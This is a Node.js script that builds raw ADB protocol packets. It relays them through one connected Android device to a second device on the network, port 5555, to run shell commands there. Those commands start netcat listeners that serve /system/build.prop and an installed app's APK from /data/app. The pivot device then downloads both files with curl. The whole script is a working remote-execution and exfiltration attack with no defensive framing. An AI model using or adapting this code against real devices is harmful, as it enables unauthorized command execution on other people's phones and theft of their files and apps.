const fs = require('fs');
const { execSync } = require('child_process');

const D1 = 'localhost:8479';
const SRC = '10.0.26.220';

function buildOpen(cmd) {
  const p = Buffer.from('shell:' + cmd + '\x00');
  const h = Buffer.alloc(24);
  h.writeUInt32LE(0x4e45504f, 0); h.writeUInt32LE(1, 4); h.writeUInt32LE(0, 8);
  h.writeUInt32LE(p.length, 12);
  let c = 0; for (const b of p) c += b;
  h.writeUInt32LE(c >>> 0, 16);
  h.writeUInt32LE((0x4e45504f ^ 0xFFFFFFFF) >>> 0, 20);
  return Buffer.concat([h, p]);
}

function trigger220(cmd, wait) {
  wait = wait || 3;
  const open = buildOpen(cmd);
  fs.writeFileSync('/tmp/adb_open_tmp.bin', open);
  execSync(`adb -s ${D1} push /tmp/adb_open_tmp.bin /sdcard/open_tmp.bin 2>/dev/null`);
  const script = `(cat /sdcard/cnxn.bin; sleep 0.5; cat /sdcard/open_tmp.bin; sleep ${wait}) | nc -w ${wait + 2} ${SRC} 5555 2>/dev/null | strings`;
  fs.writeFileSync('/tmp/d1_run.sh', script);
  execSync(`adb -s ${D1} push /tmp/d1_run.sh /sdcard/run.sh 2>/dev/null`);
  try {
    return execSync(`adb -s ${D1} shell sh /sdcard/run.sh`, {
      timeout: (wait + 10) * 1000, encoding: 'utf8', maxBuffer: 5*1024*1024
    }).split('\n').filter(l => !l.match(/^(CNXN|OKAY|WRTE|CLSE|device::)/)).join('\n').trim();
  } catch (e) { return 'ERR'; }
}

async function test() {
  // Ensure cnxn.bin
  fs.writeFileSync('/tmp/adb_cnxn.bin',
    Buffer.from('434e584e00000001001000000700000032020000bcb1a7b1686f73743a3a00', 'hex'));
  execSync(`adb -s ${D1} push /tmp/adb_cnxn.bin /sdcard/cnxn.bin 2>/dev/null`);

  // Test 1: Start nohup'd nc file server on .220, then curl from D1
  console.log('Test: nohup nc server on .220, curl from D1');

  // Build OPEN for: start nc server on .220 serving /system/build.prop on port 8888
  const serverCmd = `nohup sh -c 'printf "HTTP/1.0 200 OK\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n"; cat /system/build.prop' | nc -l -p 8888 -w 60 > /dev/null 2>&1 &
sleep 1
echo SERVER_STARTED`;

  console.log('  Starting nc server on .220...');
  const startResult = trigger220(serverCmd, 5);
  console.log('  .220 result:', startResult);

  // Now curl from D1 to .220:8888
  console.log('  Curling from D1...');
  try {
    execSync(`adb -s ${D1} shell "curl -s -o /sdcard/http_test.bin http://${SRC}:8888/ --connect-timeout 10 --max-time 30"`, {
      timeout: 40000
    });
    const size = execSync(`adb -s ${D1} shell "wc -c /sdcard/http_test.bin"`, {
      timeout: 5000, encoding: 'utf8'
    }).trim();
    console.log('  Downloaded:', size);

    // Pull to local
    execSync(`adb -s ${D1} pull /sdcard/http_test.bin /tmp/http_test.bin 2>/dev/null`);
    const content = fs.readFileSync('/tmp/http_test.bin', 'utf8');
    console.log('  Content preview:', content.slice(0, 200));
    console.log('  Total bytes:', content.length);
  } catch (e) {
    console.log('  Curl failed:', (e.stdout || e.message).toString().slice(0, 200));
  }

  // Test 2: Try serving an actual APK (small one: com.app.trademo 8.3MB)
  console.log('\nTest 2: APK file server');

  // Kill old nc first
  trigger220('kill $(pidof nc) 2>/dev/null; echo KILLED', 3);

  const apkPath = '/data/app/~~Wxk7-55Bxuh7YZnn2ZFEiA==/com.app.trademo-5zyYOz2-ozsLRT0GbiAuSQ==/base.apk';
  const apkServerCmd = `nohup sh -c 'printf "HTTP/1.0 200 OK\\r\\n\\r\\n"; cat "${apkPath}"' | nc -l -p 8889 -w 120 > /dev/null 2>&1 &
sleep 1
echo APK_SERVER_STARTED`;

  console.log('  Starting APK server on .220...');
  const apkStart = trigger220(apkServerCmd, 5);
  console.log('  .220 result:', apkStart);

  console.log('  Downloading APK via D1 curl...');
  try {
    execSync(`adb -s ${D1} shell "curl -s -o /sdcard/trademo.apk http://${SRC}:8889/ --connect-timeout 10 --max-time 120"`, {
      timeout: 140000
    });
    const size = execSync(`adb -s ${D1} shell "wc -c /sdcard/trademo.apk"`, {
      timeout: 5000, encoding: 'utf8'
    }).trim();
    console.log('  APK downloaded:', size);
  } catch (e) {
    console.log('  APK download failed:', (e.stdout || e.message).toString().slice(0, 200));
  }
}

test().catch(e => console.error(e));
